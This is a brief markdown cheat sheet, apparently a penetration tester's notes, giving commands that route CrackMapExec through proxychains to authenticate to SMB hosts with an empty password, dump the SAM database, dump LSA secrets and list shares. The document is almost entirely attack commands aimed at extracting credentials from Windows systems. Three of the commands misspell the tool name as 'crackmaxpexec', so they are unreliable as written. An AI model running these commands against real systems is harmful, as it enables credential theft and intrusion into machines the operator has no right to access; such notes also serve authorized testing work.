# Proxychains

## With CME

### Using:

```bash
sudo proxychains crackmapexec smb ip -u user -p '' -d domain
```

### Dump SAM:

```bash
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --sam
```

### Dump LSA:

```bash
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --lsa
```

### Dump shares:

```bash
sudo proxychains crackmaxpexec smb ip -u user -p '' -d domain --shares
```
